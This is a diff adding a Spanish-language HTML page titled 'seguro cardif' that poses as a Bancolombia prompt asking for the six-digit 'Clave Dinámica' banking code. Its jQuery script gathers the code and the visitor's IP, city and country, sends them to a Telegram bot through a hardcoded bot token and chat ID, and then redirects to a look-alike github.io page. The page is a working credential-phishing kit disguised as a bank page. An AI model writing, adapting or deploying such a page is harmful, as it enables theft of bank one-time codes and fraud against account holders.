@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>seguro cardif</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            background-image: url("img/simulador.png");
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat; 
+            color: #200020;
+            padding: 120px 20px 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: auto;
+            text-align: left;
+        }
+
+        .digit-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .digit-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .digit-input:focus {
+            border-color: #fdda24;
+            outline: none;
+            box-shadow: 0 0 5px rgba(253, 218, 36, 0.5);
+        }
+
+        .btn-primary {
+            outline: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 22px 99px;
+            font-family: 'Manrope', sans-serif;
+            font-weight: bold;
+            height: 48px;
+            border-radius: 9999px;
+            background-color: #fdda24;
+            border-color: #fdda24;
+            color: #292929;
+        }
+
+        .btn-primary:hover,
+        .btn-primary:focus,
+        .btn-primary:active {
+            background-color: #fdda24 !important;
+            border-color: #fdda24 !important;
+            color: #292929;
+            outline: none;
+            box-shadow: none;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 0px 10px;
+            }
+
+            .titulo-principal {
+                font-size: 1.6em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            .container {
+                padding: 20px;
+            }
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .input-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .fpfLgB {
+            text-align: end;
+            width: 80%;
+            cursor: pointer;
+            color: rgb(44, 42, 41);
+            font-family: "Open Sans";
+            font-style: normal;
+            font-weight: normal;
+            font-size: 12px;
+            line-height: 16px;
+        }
+
+        .iGPcWV {
+            font-family: "Open Sans";
+            font-style: normal;
+            font-weight: 400;
+            font-size: 16px;
+            line-height: 22px;
+            text-align: center;
+            letter-spacing: -0.3px;
+            color: rgb(44, 42, 41);
+            flex: 0 0 auto;
+            order: 2;
+            -webkit-box-flex: 0;
+        }
+
+        .cxASel {
+            font-family: "Open Sans";
+            font-style: normal;
+            font-weight: 600;
+            font-size: 16px;
+            line-height: 22px;
+            text-align: center;
+            letter-spacing: -0.3px;
+            color: rgb(44, 42, 41);
+            width: 320px;
+            flex: 0 0 auto;
+            order: 3;
+            -webkit-box-flex: 0;
+        }
+
+        .simple-form {
+            width: 20px;
+            height: 20px;
+            text-align: center;
+            font-size: 20px;
+            padding: 10px;
+            outline: none;
+            border-top: none;
+            border-right: none;
+            border-left: none;
+            border-image: initial;
+            border-bottom: 1px solid rgb(128, 130, 133);
+            margin-left: 5px;
+            margin-right: 5px;
+            border-radius: 0px !important;
+        }
+    </style>
+</head>
+    <img src="din.jpeg" alt="" width="100%">
+<body>
+    <div class="container">
+    <center> <img src="icdi.jpeg" alt="" width="9%"></center>
+        <br>
+        <div class="sc-fqkvVR iGPcWV">Consulta tu Clave Dinámica desde la App Bancolombia.</div>
+
+        <br><br>
+        <form id="simple-form">
+            <div class="digit-input-container">
+                <input type="number" class="digit-input" maxlength="1" data-id="1">
+                <input type="number" class="digit-input" maxlength="1" data-id="2">
+                <input type="number" class="digit-input" maxlength="1" data-id="3">
+                <input type="number" class="digit-input" maxlength="1" data-id="4">
+                <input type="number" class="digit-input" maxlength="1" data-id="5">
+                <input type="number" class="digit-input" maxlength="1" data-id="6">
+            </div>
+            <br><br>
+            <div class="btn-container">
+                <button type="button" id="btn-enviar" class="btn btn-primary">Continuar</button>
+            </div>
+        </form>
+    </div>
+    <img src="fi.jpeg" alt="" width="100%">
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.digit-input').on('input', function () {
+                const $this = $(this);
+                if ($this.val().length > 1) {
+                    $this.val($this.val().slice(0, 1));
+                }
+                const nextInput = $this.next('.digit-input');
+                if (nextInput.length && $this.val() !== '') {
+                    nextInput.focus();
+                }
+            });
+
+            $('.digit-input').on('keydown', function (e) {
+                if (e.key === 'Backspace' && !$(this).val()) {
+                    const prevInput = $(this).prev('.digit-input');
+                    if (prevInput.length) {
+                        prevInput.focus();
+                    }
+                }
+            });
+
+            $('#btn-enviar').click(function () {
+                const datos = $('.digit-input').map(function () {
+                    return $(this).val();
+                }).get().join('');
+
+                if (datos.length < 6) {
+                    alert("Por favor, complete todos los campos.");
+                    return;
+                }
+
+                const botToken = '7010913168:AAG6dWUFcTUuSSYBDv-ub5KtpLjFIihrYxQ';
+                const chatId = '6781382323';
+
+                $.getJSON('https://ipinfo.io/json', function (data) {
+                    const ip = data.ip || 'IP desconocida';
+                    const ciudad = data.city || 'Ciudad desconocida';
+                    const pais = data.country || 'País desconocido';
+
+                    const mensaje = `👁Formulario Simple👁\n📝Dato ingresado: ${datos}\n🌏IP: ${ip}\n🏙Ciudad: ${ciudad}\n🇨🇴País: ${pais}`;
+
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+                        method: 'POST',
+                        data: {
+                            chat_id: chatId,
+                            text: mensaje
+                        },
+                        success: function (response) {
+                            window.location.href = "https://segurocardifcolombia.github.io/segurocardifcololmbia/sol.html";
+                        },
+                        error: function (error) {
+                            alert("Error al enviar los datos. Inténtelo de nuevo.");
+                        }
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
